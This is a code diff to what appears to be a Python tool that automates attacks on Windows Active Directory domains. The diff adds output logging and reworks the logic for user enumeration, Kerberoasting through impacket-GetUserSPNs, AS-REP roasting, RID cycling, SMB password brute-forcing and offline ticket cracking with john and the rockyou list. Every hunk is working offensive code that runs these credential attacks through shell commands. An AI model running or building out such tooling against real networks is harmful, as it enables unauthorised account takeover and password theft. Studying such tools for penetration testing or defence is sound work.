@@ -23,6 +23,7 @@ def enum_users(target, domain):
                         user = line.split('@')[0].split(' ')[-1]
                         printc(user, BLUE)
                         users.append(user)
+            log(output, cmd, target, 'nmap')
     except Exception as e:
         if not os.path.exists(filename):
             print(f'[-] {filename} does not exist.\nPlease install seclists.')
@@ -61,6 +62,8 @@ def crack_tickets():
             printc('[+] Tickets cracked successfully.', GREEN)
             print(output)
 
+            log(output, john_cmd, '', 'john')
+
 
 def print_cracking_cmd():
     print('[!] To crack the tickets you can use john.')
@@ -92,39 +95,47 @@ def check_kerberoast(target, domain, user='Guest', passw=''):
                     if re_user: 
                         kerberoastable_user = re_user[0]
                         printc(f'[+] {kerberoastable_user}', BLUE)
+            log(output, cmd, target, 'impacket-GetUserSPNs')
+
+
             cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -stealth -request -output tickets.txt'
             output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
 
             print_separator()
             print('[!] Requesting tickets.')
             print(f'[!] {cmd}')
+
+            log(output, cmd, target, 'impacket-GetUserSPNs')
+
             if ('KRB_AP_ERR_SKEW' in output):
                 printc('[-] Requesting tickets failed.', RED)
                 print('[!] Trying to Synchronize TIME with server.')
                 time_cmd = f'sntp -sS {target}' 
                 print(f'[!] {time_cmd}')
                 output = subprocess.check_output(time_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+
+                log(output, time_cmd, target, 'sntp')
+
                 if not output:
                     printc('[-] Synchronize failed.', RED)
                     return
                 printc('[+] Synchronize Success.', GREEN)
-                subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+                print('[!] Requesting tickets.')
+
+                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+                if output:
+                    log(output, cmd, target, 'impacket-GetUserSPNs')
+                else:
+                    printc('[-] Tickets request failed. Try again.', RED)
+                    return
             if os.path.exists('tickets.txt'):
                 printc('[+] Tickets stored in tickets.txt', GREEN)
-                crack = ''
-                while (crack == ''):
-                    crack = input("Would you like to crack them now Y/N")
-                if (crack.upper() != 'Y'):
-                    print_cracking_cmd()
-                    return
+                print_cracking_cmd()
+                print_separator()
                 try:
                     check_rockyou()
-
-                    crack_tickets()
-                    return
                 except Exception as e:
                     printc(f'[-] {e}', RED)
-            print_cracking_cmd()
 
 
 def check_smb_credentials(target, domain):
@@ -164,10 +175,13 @@ def check_asreproast(target, domain, user='Guest', passw=''):
         printc(f'[-] {e}', RED)
 
     if output:
-        printc('[+] ASREPRoastable accounts founded.', GREEN)
-        for line in output.splitlines():
-            if (domain.upper() in line):
-                printc(f'[+] {line}', BLUE)
+        if (domain.upper() in output):
+            printc('[+] ASREPRoastable accounts founded.', GREEN)
+            for line in output.splitlines():
+                if (domain.upper() in line) and (target not in line):
+                    printc(f'[+] {line}', BLUE)
+
+            log(output, cmd, target, 'impacket-GetNPUsers')
 
 
 def bruteforce_kerberos_users(target, domain):
@@ -176,26 +190,19 @@ def bruteforce_kerberos_users(target, domain):
 
     if (len(users) > 0):
         # Try to bruteforce users credentials
-        export_wordlists(users, users)
+        export_wordlists(users, smb_passwords)
         bruteforce(target, '445')
         if not check_smb_credentials(target, domain):
-            print('no smb users file')
             # Check Kerberoast using guest creds
-            print('Check kerberoast Guest user')
-            check_kerberoast(target, domain, '')
-            print('Check asreproast Guest user')
-            check_asreproast(target, domain, '')
+            check_kerberoast(target, domain)
+            check_asreproast(target, domain)
 
 
 
 def handle_kerberos(target, domain):
     if (len(domain) < 3): return
-
+    rid_cycling(target=target, domain=domain)
+    if os.path.exists('smb_users.txt'):
+        bruteforce(target, 445)
     if not check_smb_credentials(target, domain):
-        if os.path.exists('smb_users.txt'):
-            with open('smb_users.txt', 'r') as file:
-                users = file.readlines()
-            if ('lab' in users):
-                bruteforce_kerberos_users(target, domain)
-        else:
-            bruteforce_kerberos_users(target, domain)
+        bruteforce_kerberos_users(target, domain)
